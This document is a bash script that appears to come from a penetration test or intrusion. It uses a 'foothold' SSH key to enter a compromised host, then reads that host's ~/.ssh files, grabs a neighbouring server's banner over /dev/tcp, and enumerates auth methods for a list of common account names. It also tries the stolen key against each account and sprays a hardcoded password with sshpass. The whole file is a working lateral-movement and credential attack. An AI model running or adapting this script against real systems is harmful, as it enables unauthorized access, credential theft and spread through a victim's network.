#!/bin/bash
KO="ssh -i $HOME/.ssh/keplerops-foothold -p 2222 -o StrictHostKeyChecking=no -o ConnectTimeout=10 rowan@10.50.13.180"
$KO '
echo "===== rowan .ssh"; ls -la ~/.ssh; for f in ~/.ssh/*; do echo "## $f"; head -3 "$f" 2>/dev/null; done
echo "===== banner 60.20"; timeout 6 bash -c "exec 3<>/dev/tcp/10.77.60.20/22; head -c 120 <&3" 2>&1
echo "===== auth methods"; for u in rowan cinder connector fieldlink arwc operator support admin root alterra; do
  r=$(timeout 8 ssh -o BatchMode=yes -o StrictHostKeyChecking=no -o PreferredAuthentications=none -o ConnectTimeout=5 $u@10.77.60.20 2>&1 | grep -E "Permission denied|Authentications|Welcome|password" | head -1)
  echo "$u -> $r"
done
echo "===== key auth"; for u in rowan cinder connector fieldlink arwc operator support admin root; do
  r=$(timeout 8 ssh -i ~/.ssh/keplerops-foothold -o BatchMode=yes -o StrictHostKeyChecking=no -o ConnectTimeout=5 $u@10.77.60.20 "id; hostname" 2>&1 | tail -1)
  echo "$u key -> $r"
done
echo "===== password auth test"; command -v sshpass >/dev/null && for u in rowan fieldlink arwc operator; do
  r=$(timeout 8 sshpass -p "fieldlink-dev-2841" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 $u@10.77.60.20 "id" 2>&1 | tail -1)
  echo "$u pw -> $r"
done
' 2>&1
